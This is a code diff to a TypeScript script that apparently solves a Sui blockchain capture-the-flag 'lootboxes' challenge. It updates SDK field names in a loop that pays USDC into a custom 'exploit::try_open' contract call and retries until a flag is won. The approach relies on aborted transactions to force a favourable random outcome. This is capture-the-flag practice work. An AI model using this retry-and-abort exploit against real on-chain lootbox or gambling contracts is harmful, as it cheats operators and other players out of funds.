@@ -25,7 +25,7 @@ const EXPLOIT_PACKAGE_ID = process.env.EXPLOIT_PACKAGE_ID ?? '';
 	}
 
 	const sender = keypair.getPublicKey().toSuiAddress();
-	const { data: coins } = await suiClient.listCoins({ owner: sender, coinType: USDC_COIN_TYPE });
+	const { objects: coins } = await suiClient.listCoins({ owner: sender, coinType: USDC_COIN_TYPE });
 	const total = coins?.reduce((sum, c) => sum + BigInt(c.balance), 0n) ?? 0n;
 	if (total < REQUIRED_PAYMENT) {
 		console.log(`Need at least ${REQUIRED_PAYMENT} USDC. You have ${total}.`);
@@ -34,7 +34,7 @@ const EXPLOIT_PACKAGE_ID = process.env.EXPLOIT_PACKAGE_ID ?? '';
 
 	// Try until we get a flag (contract aborts on no flag, so we retry)
 	for (let attempt = 1; ; attempt++) {
-		const { data: list } = await suiClient.listCoins({ owner: sender, coinType: USDC_COIN_TYPE });
+		const { objects: list } = await suiClient.listCoins({ owner: sender, coinType: USDC_COIN_TYPE });
 		const coin = list?.find((c) => BigInt(c.balance) >= REQUIRED_PAYMENT);
 		if (!coin) {
 			console.log('Out of USDC.');
@@ -44,8 +44,8 @@ const EXPLOIT_PACKAGE_ID = process.env.EXPLOIT_PACKAGE_ID ?? '';
 		const tx = new Transaction();
 		const payment =
 			BigInt(coin.balance) === REQUIRED_PAYMENT
-				? tx.object(coin.coinObjectId)
-				: tx.splitCoins(tx.object(coin.coinObjectId), [REQUIRED_PAYMENT])[0];
+				? tx.object(coin.objectId)
+				: tx.splitCoins(tx.object(coin.objectId), [REQUIRED_PAYMENT])[0];
 
 		tx.moveCall({
 			target: `${EXPLOIT_PACKAGE_ID}::exploit::try_open`,
@@ -58,13 +58,13 @@ const EXPLOIT_PACKAGE_ID = process.env.EXPLOIT_PACKAGE_ID ?? '';
 				transaction: tx,
 				include: { effects: true, objectTypes: true },
 			});
-			if (result.result?.effects?.status?.status === 'success') {
-				const digest = result.result.digest;
+			if (result.$kind === "Transaction") {
+				const digest = result.Transaction.digest;
 				console.log(`Flag captured after ${attempt} attempt(s). Digest:`, digest);
 				const flagId = getFlagObjectIdFromResult(result);
 				if (digest && flagId) {
-					recordFlag('lootboxes', digest, flagId);
-					console.log('Flag ID saved to FLAGS/:', flagId);
+					recordFlag("lootboxes", digest, flagId);
+					console.log("Flag ID saved to FLAGS/:", flagId);
 				}
 				return;
 			}
